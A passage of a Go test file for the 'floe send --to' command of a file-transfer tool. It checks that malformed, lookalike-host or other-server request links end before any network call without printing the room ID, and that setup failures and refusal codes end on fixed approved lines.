			s := newReqServer(t, c.answer)
			stubNetwork(t, s.URL)
			p, _ := oneFile(t, t.TempDir(), "a.bin", 16)
			r := runCLI(t, p, "--to", linkFor(), "--server", s.URL).read(o)
			wantOutcome(t, r, c.line)
			wantInOrder(t, r.stdout, "Sending   "+p+" (1 file, 16 Bytes)", tlJoining)
			if strings.Contains(r.stdout, tlConnecting) {
				t.Fatalf("Connecting... was printed without a seat:\n%s", r.stdout)
			}
		})
	}
}

// TestSendToIncompleteLinkMakesNoNetworkCall: a link without its room, or one
// that is not a request link at all, ends on TL-09 before the folder walk and
// before any network: the fake server is never hit and neither network call
// is made.
func TestSendToIncompleteLinkMakesNoNetworkCall(t *testing.T) {
	for name, link := range map[string]string{
		"no fragment":       "https://floe.one/r/Xk3p9Q0aB1c",
		"shell ate the #":   "https://floe.one/r/Xk3p9Q0aB1c ",
		"fragment not uuid": "https://floe.one/r/Xk3p9Q0aB1c#room",
		"a room link":       "https://floe.one/#room=" + uuid.New().String(),
		"empty":             "",
	} {
		t.Run(name, func(t *testing.T) {
			o := captureOutput(t)
			s := newReqServer(t, "seat")
			net := stubNetwork(t, s.URL)
			p, _ := oneFile(t, t.TempDir(), "a.bin", 16)
			r := runCLI(t, p, "--to", link, "--server", s.URL).read(o)
			wantOutcome(t, r, "This link looks incomplete. Copy the whole link again, including everything after the # sign. Put the link in quotes.")
			if _, total := s.hitCount("/"); total != 0 {
				t.Fatalf("the fake server was hit %d times", total)
			}
			if net.ice.Load() != 0 || net.connect.Load() != 0 {
				t.Fatalf("network calls made: ICE %d, connect %d", net.ice.Load(), net.connect.Load())
			}
			if strings.Contains(r.stdout, "Sending") {
				t.Fatalf("START was printed before the link was checked:\n%s", r.stdout)
			}
		})
	}
}

// TestSendToLinkTypedAsAPathIsNeverPrintedBack (review lens B re-check N5):
// a request link typed where a path goes (the --to value and the path
// swapped) ends on TL-09 before any network, never on TL-32's sentence,
// which quotes the path it could not read and so printed the link back,
// room id and all. A missing path that is not a link keeps TL-32's sentence.
func TestSendToLinkTypedAsAPathIsNeverPrintedBack(t *testing.T) {
	room := uuid.New().String()
	// FU-46 (FU-32 F5-3): every shape that carries the key, not only the ones
	// code.ParseRequestLink takes.
	for name, link := range linkAsPathShapes(room) {
		t.Run("a link where the path goes: "+name, func(t *testing.T) {
			o := captureOutput(t)
			net := stubNetwork(t, "")
			r := runCLI(t, "--to", filepath.Join(t.TempDir(), "shoot"), link).read(o)
			wantNoLinkEcho(t, r, room)
			wantOutcome(t, r, "This link looks incomplete. Copy the whole link again, including everything after the # sign. Put the link in quotes.")
			if net.ice.Load() != 0 || net.connect.Load() != 0 {
				t.Fatalf("network calls made: ICE %d, connect %d", net.ice.Load(), net.connect.Load())
			}
		})
	}
	t.Run("a missing path", func(t *testing.T) {
		o := captureOutput(t)
		net := stubNetwork(t, "")
		missing := filepath.Join(t.TempDir(), "shoot")
		r := runCLI(t, missing, "--to", linkFor()).read(o)
		if r.err == nil || !strings.Contains(r.stderr, "Error: cannot read "+missing+": ") {
			t.Fatalf("a missing path no longer ends on TL-32's sentence (%v):\n%s", r.err, r.stderr)
		}
		if net.ice.Load() != 0 || net.connect.Load() != 0 {
			t.Fatalf("network calls made: ICE %d, connect %d", net.ice.Load(), net.connect.Load())
		}
	})
}

// linkAsPathShapes are a request link as it can be typed where a path goes,
// each carrying room, the link's key (FU-46, FU-32 F5-3). code.ParseRequestLink
// takes five of them (a whole link, self-hosted, no scheme, capitals, a
// percent-encoded fragment); the others still carry the room id after a #,
// which is the rule code.Resolve refuses a request link by (FT-LINK-ECHO-F2,
// X1 to X4), or after a # that is percent-encoded, once or twice, as a link
// pasted from a mail-safety redirector is, or doubled, or followed by a space
// (FU-46 review 1 L2).
func linkAsPathShapes(room string) map[string]string {
	return map[string]string{
		"a whole link":                           "https://floe.one/r/Xk3p9Q0aB1c#" + room,
		"a self-hosted link":                     "https://files.example.com/floe/r/Xk3p9Q0aB1c/#" + room,
		"no scheme":                              "floe.one/r/Xk3p9Q0aB1c#" + room,
		"a link id one character short":          "https://floe.one/r/Xk3p9Q0aB1#" + room,
		"a link id one character long":           "https://floe.one/r/Xk3p9Q0aB1cD#" + room,
		"an extra path segment":                  "https://floe.one/r/Xk3p9Q0aB1c/x#" + room,
		"angle brackets":                         "<https://floe.one/r/Xk3p9Q0aB1c#" + room + ">",
		"quotes":                                 `"https://floe.one/r/Xk3p9Q0aB1c#` + room + `"`,
		"the room id in capitals":                "https://floe.one/r/Xk3p9Q0aB1c#" + strings.ToUpper(room),
		"a percent-encoded fragment":             fmt.Sprintf("https://floe.one/r/Xk3p9Q0aB1c#%%%02X%s", room[0], room[1:]),
		"a bad escape after the room":            "https://floe.one/r/Xk3p9Q0aB1c#" + room + "%zz",
		"a percent-encoded #":                    "https://floe.one/r/Xk3p9Q0aB1c%23" + room,
		"a bad escape, then a percent-encoded #": "https://floe.one/r/Xk3p9Q0aB1c%zz%23" + room,
		"inside a mail-safety redirector":        "https://nam12.safelinks.protection.outlook.com/?url=https%3A%2F%2Ffloe.one%2Fr%2FXk3p9Q0aB1c%23" + room + "&data=05%7C02",
		"a redirector inside a redirector":       "https://example.com/?u=https%3A%2F%2Fnam12.safelinks.protection.outlook.com%2F%3Furl%3Dhttps%253A%252F%252Ffloe.one%252Fr%252FXk3p9Q0aB1c%2523" + room,
		"a doubled #":                            "https://floe.one/r/Xk3p9Q0aB1c##" + room,
		"a space after the #":                    "https://floe.one/r/Xk3p9Q0aB1c# " + room,
	}
}

// TestLooksLikeRequestLink: every shape above is a request link, and nothing
// without a room id at the start of its fragment is: a room link (#room=),
// a path with a hash in it, a room id in a file name, a request link that
// lost its fragment (it carries no key, and keeps the stat sentence).
func TestLooksLikeRequestLink(t *testing.T) {
	room := uuid.New().String()
	for name, link := range linkAsPathShapes(room) {
		if !looksLikeRequestLink(link) {
			t.Errorf("%s: looksLikeRequestLink(%q) = false", name, link)
		}
	}
	for _, s := range []string{
		"",
		"shoot",
		"notes#1.txt",
		room + ".bin",
		"https://floe.one/#room=" + room,
		"floe.one/?room=" + room,
		"https://floe.one/r/Xk3p9Q0aB1c",
		"https://floe.one/r/Xk3p9Q0aB1c#" + room[:35],
		"https://floe.one/r/Xk3p9Q0aB1c#x" + room,
		"https://floe.one/r/Xk3p9Q0aB1c%23x" + room,
		"https://example.com/?url=https%3A%2F%2Ffloe.one%2F%23room%3D" + room,
		"notes%231.txt",
	} {
		if looksLikeRequestLink(s) {
			t.Errorf("looksLikeRequestLink(%q) = true", s)
		}
	}
}

// wantNoLinkEcho requires a run to have printed nothing of the link it was
// given: not the room id (its last 35 characters, so a percent-encoded first
// one counts too, in any case), not the link id, and not the stat sentence
// that quotes a path.
func wantNoLinkEcho(t *testing.T, r *cliRun, room string) {
	t.Helper()
	all := strings.ToLower(r.stdout + r.stderr)
	for _, leak := range []string{strings.ToLower(room[1:]), strings.ToLower("Xk3p9Q0aB1"), "cannot read"} {
		if strings.Contains(all, leak) {
			t.Fatalf("%q was printed:\nstdout:\n%s\nstderr:\n%s", leak, r.stdout, r.stderr)
		}
	}
}

// lineLinkAsPath is the line a plain send ends on for a request link typed
// as a path (FU-46, FU-32 F5-3), approved by the owner as written (D-153,
// approved-copy-cli.txt), byte for byte.
const lineLinkAsPath = "That looks like a request link, not a file. To send to it, use: floe send <files> --to <link>"

// TestSendLinkTypedAsAPathIsNeverPrintedBack (FU-46, FU-32 F5-3): a plain
// send with a request link where a path goes (--to forgotten, the likeliest
// visitor mistake) ends on one fixed line, before any network, and never on
// the stat sentence, which quoted the link twice, key and all, into
// scrollback. A missing path that is not shaped like a link, even one whose
// name holds a room id, keeps that sentence.
func TestSendLinkTypedAsAPathIsNeverPrintedBack(t *testing.T) {
	room := uuid.New().String()
	shapes := linkAsPathShapes(room)
	run := func(t *testing.T, args ...string) *cliRun {
		t.Helper()
		o := captureOutput(t)
		stubNetwork(t, "")
		// A closed port, so a send that went wrong reaches no server.
		return runCLI(t, append(args, "--server", closedServer)...).read(o)
	}
	for name, link := range shapes {
		t.Run(name, func(t *testing.T) {
			p, _ := oneFile(t, t.TempDir(), "a.bin", 16)
			r := run(t, p, link)
			wantNoLinkEcho(t, r, room)
			if r.err == nil {
				t.Fatal("the command succeeded; want exit 1")
			}
			if r.stdout != "" || r.stderr != "  "+lineLinkAsPath+"\n" {
				t.Fatalf("want the one line %q on stderr and nothing on stdout\nstdout:\n%q\nstderr:\n%q", lineLinkAsPath, r.stdout, r.stderr)
			}
		})
	}
	t.Run("the link first", func(t *testing.T) {
		p, _ := oneFile(t, t.TempDir(), "a.bin", 16)
		r := run(t, shapes["a whole link"], p)
		wantNoLinkEcho(t, r, room)
		if r.err == nil || r.stderr != "  "+lineLinkAsPath+"\n" {
			t.Fatalf("the command returned %v\nstderr:\n%q", r.err, r.stderr)
		}
	})
	for name, base := range map[string]string{
		"a missing path":                       "shoot",
		"a hash with no room id after it":      "notes#1.txt",
		"a room id in the name, not after a #": room + ".bin",
	} {
		t.Run(name, func(t *testing.T) {
			missing := filepath.Join(t.TempDir(), base)
			r := run(t, missing)
			if r.err == nil || !strings.Contains(r.stderr, "Error: cannot read "+missing+": ") {
				t.Fatalf("a missing path no longer ends on the stat sentence (%v):\n%s", r.err, r.stderr)
			}
		})
	}
}

// TestSendToOtherServerLinkEndsWithoutANetworkCall is D-144.8's replacement
// for the card's TestSendToOtherServerLinkNeedsServerFlag: a link made on
// another server, with no --server and no FLOE_SERVER, ends on TL-10 before
// any network call, so neither api.floe.one nor any other server learns its
// room id. A server named either way lets the same link through. A floe.one
// link goes through only to api.floe.one (FU-46, F5-4).
func TestSendToOtherServerLinkEndsWithoutANetworkCall(t *testing.T) {
	o := captureOutput(t)
	room := uuid.New().String()
	other := "https://files.example.com/floe/r/Xk3p9Q0aB1c#" + room
	net := stubNetwork(t, "")
	p, _ := oneFile(t, t.TempDir(), "a.bin", 16)
	r := runCLI(t, p, "--to", other).read(o)
	wantOutcome(t, r, tlSetupFailed)
	if net.ice.Load() != 0 || net.connect.Load() != 0 {
		t.Fatalf("network calls made: ICE %d, connect %d", net.ice.Load(), net.connect.Load())
	}

	const (
		floeServer = "https://api.floe.one"
		selfHosted = "https://files.example.com"
	)
	floe := "https://floe.one/r/Xk3p9Q0aB1c#" + room
	for _, c := range []struct {
		link   string
		chosen bool
		server string
		want   bool
	}{
		{other, false, floeServer, true},
		{other, true, selfHosted, false},
		{floe, false, floeServer, false},
		{"https://WWW.floe.one/r/Xk3p9Q0aB1c#" + room, false, floeServer, false},
		{"floe.one/r/Xk3p9Q0aB1c#" + room, false, floeServer, false},
		{"https://floe.one./r/Xk3p9Q0aB1c#" + room, false, floeServer, false},
		{"https://floe.one.example.com/r/Xk3p9Q0aB1c#" + room, false, floeServer, true},
		{"http://localhost:3000/r/Xk3p9Q0aB1c#" + room, false, floeServer, true},
		// F5-4: a floe.one link with a server chosen goes through only when
		// that server is api.floe.one once normalized.
		{floe, true, floeServer, false},
		{floe, true, " https://api.floe.one// ", false},
		{floe, true, selfHosted, true},
		{floe, true, "http://127.0.0.1:3001", true},
		{floe, true, "https://floe.one", true},
		{floe, true, "http://api.floe.one", true},
		{floe, true, "https://api.floe.one.example.com", true},
		// N4 (FU-46 review 1): api.floe.one is compared parsed, so every
		// spelling that reaches it goes through (https in any case, the host
		// in any case and with one trailing dot, port 443, no path) and
		// anything else still ends on TL-10.
		{floe, true, "https://API.floe.one", false},
		{floe, true, "HTTPS://Api.Floe.One", false},
		{floe, true, "https://api.floe.one:443", false},
		{floe, true, "https://api.floe.one.", false},
		{floe, true, " https://API.FLOE.ONE.:443/ ", false},
		{floe, true, "http://api.floe.one:443", true},
		{floe, true, "wss://api.floe.one", true},
		{floe, true, "api.floe.one", true},
		{floe, true, "//api.floe.one", true},
		{floe, true, "https://user@api.floe.one", true},
		{floe, true, "https://user:secret@api.floe.one", true},
		{floe, true, "https://api.floe.one:8443", true},
		{floe, true, "https://api.floe.one:80", true},
		{floe, true, "https://api.floe.one:", true},
		{floe, true, "https://api.floe.one/floe", true},
		{floe, true, "https://api.floe.one?x=1", true},
		{floe, true, "https://api.floe.one#x", true},
		{floe, true, "https://api.floe.one..", true},
		{floe, true, "https://xapi.floe.one", true},
		{floe, true, "https://floe.one.api.floe.one", true},
		{"https://www.floe.one/r/Xk3p9Q0aB1c#" + room, true, selfHosted, true},
		{"floe.one/r/Xk3p9Q0aB1c#" + room, true, selfHosted, true},
		{"https://floe.one./r/Xk3p9Q0aB1c#" + room, true, selfHosted, true},
		// N1 (FU-46 review 1, FU-53): a host a browser maps to floe.one
		// (IDNA: fullwidth letters and dots, the ideographic full stop,
		// circled letters, a soft hyphen, a percent-encoded fullwidth letter)
		// is floe.one: with another server it ends on TL-10, with none it
		// goes to api.floe.one, where its room is.
		{"https://ｆｌｏｅ.one/r/Xk3p9Q0aB1c#" + room, true, selfHosted, true},
		{"https://www.ｆｌｏｅ.one/r/Xk3p9Q0aB1c#" + room, true, selfHosted, true},
		{"https://ＦＬＯＥ．ＯＮＥ/r/Xk3p9Q0aB1c#" + room, true, selfHosted, true},
		{"https://floe。one/r/Xk3p9Q0aB1c#" + room, true, selfHosted, true},
		{"https://ⓕⓛⓞⓔ.one/r/Xk3p9Q0aB1c#" + room, true, selfHosted, true},
		{"https://flo\u00ade.one/r/Xk3p9Q0aB1c#" + room, true, selfHosted, true},
		{"https://%EF%BD%86loe.one/r/Xk3p9Q0aB1c#" + room, true, selfHosted, true},
		{"https://ｆｌｏｅ.one/r/Xk3p9Q0aB1c#" + room, true, floeServer, false},
		{"https://ｆｌｏｅ.one/r/Xk3p9Q0aB1c#" + room, false, floeServer, false},
		{"https://ｆｌｏｅ.one.example.com/r/Xk3p9Q0aB1c#" + room, true, selfHosted, false},
		{"https://ｆｌｏｅ.one.example.com/r/Xk3p9Q0aB1c#" + room, false, floeServer, true},
		// FU-53 review 1 L-2: a link whose host url.Parse cannot read (the
		// slashes a browser reads past) is a mismatch with a server chosen
		// too, never the self-hosted case.
		{"https:///floe.one/r/Xk3p9Q0aB1c#" + room, true, selfHosted, true},
		{"https:/floe.one/r/Xk3p9Q0aB1c#" + room, true, selfHosted, true},
		{"/floe.one/r/Xk3p9Q0aB1c#" + room, true, selfHosted, true},
	} {
		if got := linkServerMismatch(c.link, c.chosen, c.server); got != c.want {
			t.Errorf("linkServerMismatch(%q, %v, %q) = %v, want %v", c.link, c.chosen, c.server, got, c.want)
		}
	}
	// FLOE_SERVER names the server as well as --server does.
	if !serverChosen(sendCmd, func(k string) string {
		if k == "FLOE_SERVER" {
			return "https://files.example.com"
		}
		return ""
	}) {
		t.Fatal("FLOE_SERVER does not count as a chosen server")
	}
}

// TestSendToFloeLinkWithAnotherServerEndsWithoutANetworkCall (FU-46, FU-32
// F5-4): a floe.one link's room lives only on api.floe.one, so a run pointed
// at any other server (FLOE_SERVER, the standing setting a self-hoster keeps,
// or --server typed) ends on TL-10 before any network call. That server never
// sees the ICE fetch or the request-join that would hand it the room id, with
// which its operator could take the link's one seat on api.floe.one. A server
// that normalizes to api.floe.one lets the link through to the ICE fetch,
// which the stub refuses.
func TestSendToFloeLinkWithAnotherServerEndsWithoutANetworkCall(t *testing.T) {
	prev := sendToJoinTimeout
	sendToJoinTimeout = 300 * time.Millisecond
	t.Cleanup(func() { sendToJoinTimeout = prev })
	room := uuid.New().String()
	for _, c := range []struct {
		name string
		link string
		// envServer: FLOE_SERVER is the fake's URL; otherwise --server is.
		envServer bool
	}{
		{"FLOE_SERVER set", "https://floe.one/r/Xk3p9Q0aB1c#" + room, true},
		{"FLOE_SERVER set, www and no scheme", "www.floe.one/r/Xk3p9Q0aB1c#" + room, true},
		{"--server typed", "https://WWW.floe.one/r/Xk3p9Q0aB1c#" + room, false},
		// L-2 (FU-53 review 1): no host url.Parse can read.
		{"FLOE_SERVER set, three slashes", "https:///floe.one/r/Xk3p9Q0aB1c#" + room, true},
		// N1 (FU-53): the host in fullwidth letters, as a browser reads it.
		{"--server typed, fullwidth", "https://ｆｌｏｅ.one/r/Xk3p9Q0aB1c#" + room, false},
		{"FLOE_SERVER set, fullwidth www and dots", "https://www．ｆｌｏｅ．one/r/Xk3p9Q0aB1c#" + room, true},
	} {
		t.Run(c.name, func(t *testing.T) {
			o := captureOutput(t)
			s := newReqServer(t, "none")
			net := stubNetwork(t, s.URL)
			p, _ := oneFile(t, t.TempDir(), "a.bin", 16)
			var r *cliRun
			if c.envServer {
				r = startCLIEnv(t, map[string]string{"FLOE_SERVER": s.URL}, p, "--to", c.link)
			} else {
				r = startCLI(t, p, "--to", c.link, "--server", s.URL)
			}
			r.wait(t, 30*time.Second).read(o)
			if ice, connect := net.ice.Load(), net.connect.Load(); ice != 0 || connect != 0 {
				t.Fatalf("network calls made: ICE %d, connect %d", ice, connect)
			}
			if _, total := s.hitCount("/"); total != 0 {
				t.Fatalf("the other server was hit %d times", total)
			}
			wantOutcome(t, r, tlSetupFailed)
			if strings.Contains(r.stdout, "Sending") {
				t.Fatalf("START was printed before the server was checked:\n%s", r.stdout)
			}
			if strings.Contains(r.stdout+r.stderr, room) {
				t.Fatalf("the room id was printed:\nstdout:\n%s\nstderr:\n%s", r.stdout, r.stderr)
			}
		})
	}
	// Every spelling of api.floe.one reaches the ICE fetch (N4, FU-46 review
	// 1); nothing else does. Nothing is allowed: the fetch is counted and
	// refused, never made.
	for _, c := range []struct {
		server  string
		reaches bool
	}{
		{" https://api.floe.one/ ", true},
		{"https://API.floe.one", true},
		{"https://api.floe.one:443", true},
		{"https://api.floe.one.", true},
		{"http://api.floe.one", false},
		{"https://user@api.floe.one", false},
		{"https://api.floe.one:8443", false},
		{"https://api.floe.one.example.com", false},
	} {
		t.Run("FLOE_SERVER is "+strings.TrimSpace(c.server), func(t *testing.T) {
			o := captureOutput(t)
			net := stubNetwork(t, "")
			p, _ := oneFile(t, t.TempDir(), "a.bin", 16)
			r := startCLIEnv(t, map[string]string{"FLOE_SERVER": c.server}, p, "--to", floeLinkFor())
			r.wait(t, 30*time.Second).read(o)
			wantOutcome(t, r, tlSetupFailed)
			want := int32(0)
			if c.reaches {
				want = 1
			}
			if ice, connect := net.ice.Load(), net.connect.Load(); ice != want || connect != 0 {
				t.Fatalf("ICE fetches %d, connects %d; want %d and 0", ice, connect, want)
			}
		})
	}
}

// TestSendToRelayOnlyWithoutARelayEndsBeforeTheJoin: --relay-only against a
// server that offers no TURN relay ends on today's TL-12 sentence right after
// the ICE fetch and before any connect, so the link's one seat stays free
// (review lens A, M3: otherwise the visitor takes the seat and ends on TL-10
// at the 30 s setup bound).
func TestSendToRelayOnlyWithoutARelayEndsBeforeTheJoin(t *testing.T) {
	o := captureOutput(t)
	s := newReqServer(t, "seat")
	calls := stubNetwork(t, s.URL)
	p, _ := oneFile(t, t.TempDir(), "a.bin", 16)
	r := startCLI(t, p, "--to", linkFor(), "--server", s.URL, "--relay-only")
	r.wait(t, 10*time.Second).read(o)
	const want = "--relay-only needs a TURN relay and "
	if r.err == nil || !strings.HasPrefix(r.err.Error(), want) || !strings.Contains(r.stderr, "Error: "+want) {
		t.Fatalf("the command returned %v, want TL-12's sentence through cobra\nstderr:\n%s", r.err, r.stderr)
	}
	if ice, connect := calls.ice.Load(), calls.connect.Load(); ice != 1 || connect != 0 {
		t.Fatalf("ICE fetches %d, connects %d; want the one fetch and no connect", ice, connect)
	}
}

// TestSendToPickTimeLimitsEndBeforeAnyNetwork: over 10,000 files (TL-30) and
// a file whose description cannot fit one control message (TL-31) end on
// their own lines before the ICE fetch or any connect, through the command
// (review lens A, M5: only the engine's precheck was tested, so nothing told
// the two lines apart). Real files, walked as the send walks them: the
// second is a file two folders deep whose path the wire escapes past one
// control message.
func TestSendToPickTimeLimitsEndBeforeAnyNetwork(t *testing.T) {
	for _, c := range []struct {
		name  string
		pick  func(t *testing.T) string
		lines []string
	}{
		{"over 10,000 files (TL-30)", func(t *testing.T) string {
			dir := filepath.Join(t.TempDir(), "archive")
			if err := os.MkdirAll(dir, 0o700); err != nil {
				t.Fatal(err)
			}
			for i := 0; i <= transfer.MaxDropFiles; i++ {
				if err := os.WriteFile(filepath.Join(dir, fmt.Sprintf("f%05d", i)), nil, 0o600); err != nil {
					t.Fatal(err)
				}
			}
			return dir
		}, []string{"This drop has more than 10,000 files. Zip them first."}},
		{"a description over one control message (TL-31)", func(t *testing.T) string {
			// U+2028, which the wire still writes as a six-byte escape; & is one
			// byte there since the metadata frame dropped HTML escaping (T13-F2).
			// It is three bytes on disk, so a single name of 160 is longer than
			// the 255 bytes ext4 allows a name (CI's ubuntu runner, 2026-10-09);
			// two folders of 80 each fit and still put 960 escaped bytes in the
			// path the frame carries.
			dir := filepath.Join(t.TempDir(), "deep")
			seg := strings.Repeat(string(rune(0x2028)), 80)
			oneFile(t, filepath.Join(dir, seg, seg), "a.bin", 16)
			return dir
		}, []string{"A folder path is too long to send. Zip deeply nested folders first."}},
	} {
		t.Run(c.name, func(t *testing.T) {
			o := captureOutput(t)
			s := newReqServer(t, "seat")
			calls := stubNetwork(t, s.URL)
			path := c.pick(t)
			r := runCLI(t, path, "--to", linkFor(), "--server", s.URL).read(o)
			wantOutcome(t, r, c.lines...)
			if ice, connect := calls.ice.Load(), calls.connect.Load(); ice != 0 || connect != 0 {
				t.Fatalf("ICE fetches %d, connects %d before a pick-time refusal; want none", ice, connect)
			}
		})
	}
}

// ── Setup ────────────────────────────────────────────────────────────────────

// silentHost is seated and never offers or prints, so the visitor waits in
// setup until something ends it.
func silentHost(h *testHost) error {
	<-h.quit
	return nil
}

// endsWithin runs the visitor to the setup wait, fires trigger, and requires
// the command to end on TL-10 within bound of it, far below the 30 s setup
// timeouts. The host is silent, so nothing prints once the command is done.
func endsWithin(t *testing.T, o *output, s *reqServer, bound time.Duration, trigger func()) {
	t.Helper()
	endsOn(t, o, s, bound, trigger, tlSetupFailed)
}

// endsOn is endsWithin for an ending of the test's choosing.
func endsOn(t *testing.T, o *output, s *reqServer, bound time.Duration, trigger func(), line string) {
	t.Helper()
	stubNetwork(t, s.URL)
	p, _ := oneFile(t, t.TempDir(), "a.bin", 16)
	r := startCLI(t, p, "--to", linkFor(), "--server", s.URL)
	select {
	case <-s.seated:
	case <-time.After(20 * time.Second):
		t.Fatal("the visitor was never seated")
	}
	// Past the seat, the visitor answers the join and enters setup. What the
	// trigger makes the server send waits in the client's channels either way.
	time.Sleep(200 * time.Millisecond)
	fired := time.Now()
	trigger()
	r.wait(t, 20*time.Second).read(o)
	if took := r.ended.Sub(fired); took > bound {
		t.Fatalf("the command ended %v after the trigger, want within %v", took, bound)
	}
	wantOutcome(t, r, line)
	wantInOrder(t, r.stdout, tlJoining, tlConnecting)
	if strings.Contains(r.stdout, tlWaiting) {
		t.Fatalf("WAIT was printed although setup never finished:\n%s", r.stdout)
	}
}

// TestSendToEvictionEndsAsSetupFailure: room-full after request-joined (the
// host reopened the link, E-03) ends the setup at once with TL-10.
func TestSendToEvictionEndsAsSetupFailure(t *testing.T) {
	o := captureOutput(t)
	s := newReqServer(t, "seat")
	startHost(t, s, silentHost)
	endsWithin(t, o, s, 2*time.Second, s.evict)
}

// TestSendToHostLeftDuringSetupEndsAtOnce: the host leaving before the answer
// completes ends the command within 2 s on TL-10 (D-144.8), whichever way the
// server says it: host-absent to a visitor in an unsealed room (setupWatched),
// peer-disconnected in a sealed one (S1-ENG-11's ErrPeerLeft), or this
// visitor's own socket to the server closing (ErrSignalingLost).
func TestSendToHostLeftDuringSetupEndsAtOnce(t *testing.T) {
	t.Run("unsealed: host-absent", func(t *testing.T) {
		o := captureOutput(t)
		s := newReqServer(t, "seat")
		startHost(t, s, silentHost)
		endsWithin(t, o, s, 2*time.Second, func() { s.drop(true) })
	})
	t.Run("sealed: peer-disconnected", func(t *testing.T) {
		o := captureOutput(t)
		s := newReqServer(t, "seat")
		startHost(t, s, silentHost)
		endsWithin(t, o, s, 2*time.Second, func() { s.seal(); s.drop(true) })
	})
	t.Run("the server connection lost", func(t *testing.T) {
		o := captureOutput(t)
		s := newReqServer(t, "seat")
		startHost(t, s, silentHost)
		endsWithin(t, o, s, 2*time.Second, func() { s.drop(false) })
	})
}

// TestSendToDisabledDuringSetupEndsOnTL07: request links turned off while the
// visitor is seated but not yet connected (the server's policy purge sends
// disabled to a seated, unsealed visitor) end the setup at once on TL-07, not
// TL-10: the one setup ending with an approved line of its own (handback 1,
// D6; review lens A, M2).
func TestSendToDisabledDuringSetupEndsOnTL07(t *testing.T) {
	o := captureOutput(t)
	s := newReqServer(t, "seat")
	startHost(t, s, silentHost)
	endsOn(t, o, s, 2*time.Second, s.disable, "Request links are turned off right now.")
}

// TestSendToLinkEndedDuringSetupEndsOnItsLine: the host closing the link while
// the visitor is seated but not yet connected ends the setup at once on the
// approved D-176 line, not on "Couldn't connect" (W3 R1-03).
func TestSendToLinkEndedDuringSetupEndsOnItsLine(t *testing.T) {
	o := captureOutput(t)
	s := newReqServer(t, "seat")
	startHost(t, s, silentHost)
	endsOn(t, o, s, 2*time.Second, s.endLink, "This link has ended. Ask them for a new link.")
}

// TestWatchSetupReportsASeatTakenAsSetupSucceeds: a seat taken away at the
// moment the setup succeeds ends the setup on its reason, because the watcher
// has already closed the connection; with no event the channel comes back
// untouched, and an event after the answer closes nothing (review lens A,
// nit 10). No network: the setup is a func the test controls.
func TestWatchSetupReportsASeatTakenAsSetupSucceeds(t *testing.T) {
	type watch struct {
		roomFull, hostAbsent, linkEnded, disabled chan struct{}
		closed                                    chan struct{}
		closeOnce                                 sync.Once
	}
	newWatch := func() *watch {
		return &watch{
			roomFull: make(chan struct{}, 1), hostAbsent: make(chan struct{}, 1), linkEnded: make(chan struct{}, 1),
			disabled: make(chan struct{}, 1), closed: make(chan struct{}),
		}
	}
	run := func(w *watch, setup func() (*webrtc.DataChannel, error)) (*webrtc.DataChannel, string, error) {
		return watchSetup(w.roomFull, w.hostAbsent, w.linkEnded, w.disabled, func() { w.closeOnce.Do(func() { close(w.closed) }) }, setup)
	}
	open := &webrtc.DataChannel{}
	events := func(w *watch) map[string]chan struct{} {
		return map[string]chan struct{}{"room-full": w.roomFull, "host-absent": w.hostAbsent, "link-ended": w.linkEnded, "disabled": w.disabled}
	}

	for _, event := range []string{"room-full", "host-absent", "link-ended", "disabled"} {
		w := newWatch()
		fire := events(w)[event]
		// The setup succeeds, but only once the event is in and the watcher
		// has closed the connection under it.
		dc, ended, err := run(w, func() (*webrtc.DataChannel, error) {
			fire <- struct{}{}
			<-w.closed
			return open, nil
		})
		if dc != nil || ended != event || !errors.Is(err, peer.ErrClosed) {
			t.Fatalf("%s as setup succeeded: (%v, %q, %v), want no channel, %q, peer.ErrClosed", event, dc, ended, err, event)
		}
		// The usual order: the watcher's close is what ends the setup.
		w = newWatch()
		fire = events(w)[event]
		if _, ended, err := run(w, func() (*webrtc.DataChannel, error) {
			fire <- struct{}{}
			<-w.closed
			return nil, peer.ErrClosed
		}); ended != event || err == nil {
			t.Fatalf("%s during setup: (%q, %v)", event, ended, err)
		}
	}

	w := newWatch()
	dc, ended, err := run(w, func() (*webrtc.DataChannel, error) { return open, nil })
	if dc != open || ended != "" || err != nil {
		t.Fatalf("no event: (%v, %q, %v), want the channel back", dc, ended, err)
	}
	w.roomFull <- struct{}{}
	select {
	case <-w.closed:
		t.Fatal("an event after the answer closed the connection")
	case <-time.After(100 * time.Millisecond):
	}
}

// ── Refusals ─────────────────────────────────────────────────────────────────

// approvedRefusal is every code's block at saved 0 (TL-14 to TL-26); the
// unknown codes take TL-26.
var approvedRefusal = []struct {
	code  string
	lines []string
}{
	{"declined", []string{"They declined. Nothing was sent."}},
	{"expired", []string{"They did not answer in time. Nothing was sent."}},
	{"disk-full", []string{"Their computer ran out of space.", "Nothing was sent."}},
	{"write-failed", []string{"Their computer could not save a file.", "Nothing was sent."}},
	{"hash-mismatch", []string{"A file changed or was damaged on the way, so their Floe deleted it.", "Nothing was sent.", "Ask them for a new link to send the rest."}},
	{"relay-cap", []string{"Relayed drops are capped at 2 GB.", "Nothing was sent. Send under 2 GB."}},
	{"path-too-long", []string{"A folder path is too long for their computer. Zip deeply nested folders first.", "Nothing was sent."}},
	{"file-too-large-for-folder", []string{"A file is too large for the drive they save to.", "Nothing was sent."}},
	{"save-blocked", []string{"A file arrived but their computer blocked saving it.", "Nothing was sent."}},
	{"over-approved", []string{"More data arrived than they accepted. If files changed after you chose them, ask them for a new link.", "Nothing was sent."}},
	{"stopped", []string{"They stopped this drop.", "Nothing was sent."}},
	{"time-limit", []string{"This drop reached the 24-hour limit, so their Floe stopped it.", "Nothing was sent."}},
	{"too-slow", []string{"The drop stopped on their computer.", "Nothing was sent."}},
	{"not-a-code", []string{"The drop stopped on their computer.", "Nothing was sent."}},
}

// TestSendToEveryRefusalCodeHasFixedLine: a host that refuses with each of
// the twelve codes, and with two it does not know, ends the command on that
// code's approved block and a non-zero exit, through the wire and the whole
// command. The saved forms are pinned below in TestSendToOutcomeLines.
func TestSendToEveryRefusalCodeHasFixedLine(t *testing.T) {
	if len(approvedRefusal) != len(transfer.RefusalCodes)+2 {
		t.Fatalf("the table has %d rows for %d codes", len(approvedRefusal), len(transfer.RefusalCodes))
	}
	for _, c := range approvedRefusal {
		t.Run(c.code, func(t *testing.T) {
			o := captureOutput(t)
			s := newReqServer(t, "seat")
			stubNetwork(t, s.URL)
			p, _ := oneFile(t, t.TempDir(), "a.bin", 4096)
			h := startHost(t, s, refuseAtMetadata(`{"type":"incompatible","reason":"receiver stopped the transfer","pv":1,"pvMin":1,"ver":"desktop-test","code":"`+c.code+`","saved":0}`))
			r := runCLI(t, p, "--to", linkFor(), "--server", s.URL)
